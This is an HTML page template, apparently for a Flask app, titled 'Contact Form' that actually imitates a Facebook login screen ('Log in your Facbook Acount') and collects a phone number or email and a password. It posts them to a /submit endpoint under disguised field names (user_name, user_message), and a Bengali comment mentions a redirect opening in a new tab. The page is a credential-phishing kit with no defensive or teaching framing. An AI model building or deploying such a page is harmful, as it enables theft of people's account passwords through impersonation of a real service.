<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;

        }
        .input-group input {
            width: 100%;
            padding: 12px 40px 12px 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
        }
        .submit-btn {
            width: 100%;
            background-color: #0091cf;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #007eb4;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <div class="f-logo">
            <img src="{{ url_for('static', filename='favicon.png') }}" alt="logo" style="width: 35px;">
        </div>
        <div class="text">
            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in your Facbook Acount</h5>
        </div>
        <!-- target="_blank" দেওয়ার ফলে নতুন ট্যাবে রিডাইরেক্ট লিংক ওপেন হবে -->
        <form action="/submit" method="POST" target="_blank">
            <div class="input-group">
                <label for="user_name">Phone number:</label>
                <input type="text" id="user_name" name="user_name"placeholder="Phone number or Email address" required>
            </div>

            <div class="input-group">
                <label for="user_message">Password:</label>
                <input type="text" id="user_message" name="user_message"placeholder="Enter Password" required>
            </div>

            <button type="submit" class="submit-btn">Log in</button>
        </form>
    </div>

</body>
</html>
